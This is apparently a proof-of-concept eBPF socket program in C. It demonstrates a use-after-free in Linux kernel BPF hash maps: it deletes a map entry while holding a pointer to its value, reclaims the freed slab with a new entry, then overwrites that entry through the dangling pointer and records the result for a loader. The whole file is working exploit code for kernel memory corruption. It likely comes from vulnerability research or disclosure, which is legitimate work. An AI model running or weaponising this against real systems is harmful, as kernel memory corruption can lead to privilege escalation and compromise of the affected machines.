// SPDX-License-Identifier: GPL-2.0
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8);
    __type(key, __u32);
    __type(value, __u64);
} data_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 8);
    __type(key, __u32);
    __type(value, __u64);
} results SEC(".maps");

SEC("socket")
int poc_uaf_write_reuse(struct __sk_buff *skb)
{
    __u32 k0 = 0, k2 = 2;
    __u64 *val;

    // 1. Create an entry (K0) so lookup succeeds
    __u64 init = 0xdeadbeefcafe0001ULL;
    bpf_map_update_elem(&data_map, &k0, &init, BPF_ANY);

    // 2. Get a writable pointer to K0's value
    val = bpf_map_lookup_elem(&data_map, &k0);
    if (!val) return 0;

    // 3. Delete K0 – val is now dangling, but the verifier doesn't know
    bpf_map_delete_elem(&data_map, &k0);

    // 4. Reclaim the freed slab with a new entry (K2) containing a known sentinel
    __u64 sentinel = 0x5151515151515151ULL;
    bpf_map_update_elem(&data_map, &k2, &sentinel, BPF_ANY);

    // 5. Write a different pattern through the stale pointer
    *val = 0x4141414141414141ULL;   // should overwrite K2's value

    // 6. Read back K2 to verify the corruption
    __u64 *k2_val = bpf_map_lookup_elem(&data_map, &k2);
    __u32 rk = 0;
    __u64 out = k2_val ? *k2_val : 0;
    bpf_map_update_elem(&results, &rk, &out, BPF_ANY);  // result[0] = K2 value after write

    // Also store the original sentinel for reference
    rk = 1;
    bpf_map_update_elem(&results, &rk, &sentinel, BPF_ANY); // result[1] = original sentinel

    // Store the write pattern
    rk = 2;
    __u64 pattern = 0x4141414141414141ULL;
    bpf_map_update_elem(&results, &rk, &pattern, BPF_ANY); // result[2] = write pattern

    // Sentinel for loader
    rk = 3;
    out = 0xdeadbeef;
    bpf_map_update_elem(&results, &rk, &out, BPF_ANY);

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
